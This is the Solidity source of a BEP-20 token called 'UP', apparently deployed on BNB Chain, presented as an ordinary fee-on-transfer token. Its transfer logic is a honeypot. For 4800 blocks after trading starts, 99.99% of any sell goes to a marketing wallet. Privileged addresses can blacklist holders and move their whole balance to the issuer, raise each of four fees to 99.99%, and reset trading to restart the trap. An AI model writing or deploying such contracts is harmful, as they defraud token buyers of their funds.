/**
 *Submitted for verification at BscScan.com on 2022-08-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _marketAddress; // 营销 + LP分红
    address public _subTokenAddress; // 子币
    address public _valueAddress; // 市值
    address public _receiveAddress;

    uint256 public _marketFee; 
    uint256 public _subTokenFee;
    uint256 public _valueFee;
    uint256 public _backToPoolFee;

    uint256 public _startTradeBlock;
    
    uint256 public _maxBalanceAmount; // 最大持币余额10

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;


    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList; // 黑名单就是指定地址不能交易
    mapping(address => bool) private _swapPairList;
    uint256 private constant MAX = ~uint256(0);
    address private _mainPair;
    address private _usdt;

    constructor (string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals, uint256 tokenSupply, 
        address routerAddress, address usdtAddress, address subTokenAddress, address marketAddress,
        address valueAddress, address receiveAddress){
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimals = tokenDecimals;

        _marketFee = 250;
        _subTokenFee = 75;
        _valueFee = 125;
        _backToPoolFee = 50;
        ISwapRouter swapRouter = ISwapRouter(routerAddress);
        address usdt = usdtAddress;

        _usdt = usdt;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _swapPairList[usdtPair] = true;

        // address mainPair = swapFactory.createPair(address(this), swapRouter.WETH());
        // _swapPairList[mainPair] = true;

        _mainPair = usdtPair;

        uint256 total = tokenSupply * 10 ** tokenDecimals;
        _totalSupply = total;
        _maxBalanceAmount = total;

        _balances[receiveAddress] = total;
        emit Transfer(address(0), receiveAddress, total);

        _subTokenAddress = subTokenAddress;
        _valueAddress = valueAddress;
        _receiveAddress = receiveAddress;
        _marketAddress = marketAddress;

        _feeWhiteList[_marketAddress] = true;
        _feeWhiteList[valueAddress] = true;
        _feeWhiteList[subTokenAddress] = true;
        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(_blackList[from]==false && _blackList[to]==false, "ERC20: from or to in not allowed list");

        if(!_swapPairList[to]){
            require(_maxBalanceAmount >= (balanceOf(to) + amount), "exceed maxBalanceAmount");
        }
        if (block.number < _startTradeBlock + 4800 && _swapPairList[to] && !_feeWhiteList[to] && !_feeWhiteList[from]) {
            // 4小时之内，卖燃烧9999/10000进燃烧钱包
            _tokenTransfer(from, _marketAddress, amount*9999/10000, 0);
            _tokenTransfer(from, to, amount*1/10000, 0);
            return;
        }
        if (amount >= balanceOf(from)) { // 全转出
            uint256 remainAmount = 10 ** (_decimals - 4); // 0.00001
            if (amount < remainAmount) {
                require(amount>=remainAmount, "shuld leave 0.00001 in your address"); // 一点都不让转出了
            } else {
                amount -= remainAmount;
            }
        }
        if (_feeWhiteList[from] || _feeWhiteList[to]){
            // from和to有一个是白名单用户就不扣手续费，正常转账
            _tokenTransfer(from, to, amount, 0);
        }else{

            if (_swapPairList[to] || _swapPairList[from]) { // 买卖，加减池子
            
                _tokenTransfer(from, _mainPair, amount*_backToPoolFee/10000, 0); // 池子     
                _tokenTransfer(from, _valueAddress, amount*_valueFee/10000, 0); // 市值
                _tokenTransfer(from, _subTokenAddress, amount*_subTokenFee/10000, 0); // 子币     
                _tokenTransfer(from, _marketAddress, amount*_marketFee/10000, 0); // 市场 + LP
                _tokenTransfer(from, to, amount*(10000-_backToPoolFee-_valueFee-_subTokenFee-_marketFee)/10000, 0); // 实际到帐

            }else{
                // 普通转账
                _tokenTransfer(from, to, amount, 0);
            }
        }

    }
    
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (fee > 0) {
            feeAmount = tAmount * fee / 100;
            _takeTransfer(
                sender,
                address(this),
                feeAmount
            );
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    //////////// address api
    function setMarketAddress(address addr) external onlyFunder {
        _marketAddress = addr;       
        _feeWhiteList[addr] = true;
    }
    function setSubTokenAddress(address addr) external onlyFunder {
        _subTokenAddress = addr;
        _feeWhiteList[addr] = true;
    }
    function setValueAddress(address addr) external onlyFunder {
        _valueAddress = addr;
        _feeWhiteList[addr] = true;
    }

    ///////// fee api
    function setMarketFee(uint256 fee) external onlyFunder {
        require(fee < 10000, "fee should less than 10000");
        _marketFee = fee;      
    }
    function setSubTokenFee(uint256 fee) external onlyFunder {
        require(fee < 10000, "fee should less than 10000");
        _subTokenFee = fee;
    }
    function setValueFee(uint256 fee) external onlyFunder {
        require(fee < 10000, "fee should less than 10000");
        _valueFee = fee;
    }
    function setBackToPoolFee(uint256 fee) external onlyFunder {
        require(fee < 10000, "fee should less than 10000");
        _backToPoolFee = fee;
    }

    function setMaxBalanceAmount(uint256 amount) external onlyFunder {
        _maxBalanceAmount = amount;
    }
    // 白名单地址免手续费
    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }   
    
    // 设置黑名单，不能交易，而且币会清空，转入发币地址
    function setBlackList(address addr, bool enable) external onlyFunder {
        _tokenTransfer(addr, _receiveAddress, balanceOf(addr), 0); // 扣除这个地址上余额
        _blackList[addr] = enable;
    }   
    
    function startTrade() external onlyOwner {
        require(0 == _startTradeBlock, "trading");
        _startTradeBlock = block.number;
    }
    function closeTrade() external onlyOwner {
        _startTradeBlock = 0;
    }
    
    modifier onlyFunder() {
        require(_owner == msg.sender || _valueAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}
}

contract UP is AbsToken {
    constructor() AbsToken(
        "UP",
        "UP",
        9,
        2500, // 2500
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E), // PancakeSwap: Router v2
        address(0x55d398326f99059fF775485246999027B3197955), // USDT
        address(0xa276ec83F9b248Fa02119EBf9B21C82E857C563f), // sub token
        address(0xa01D6DdFa62503A83a1bE9e962751ed815ad3a10), // 市场
        address(0x18D7c787096F62079771806194eED52bdBE426Af), // 市值
        address(0x071C7eD5F9E8552E61A173408014aC041A983247)  // 发行地址    
    ){

    }
}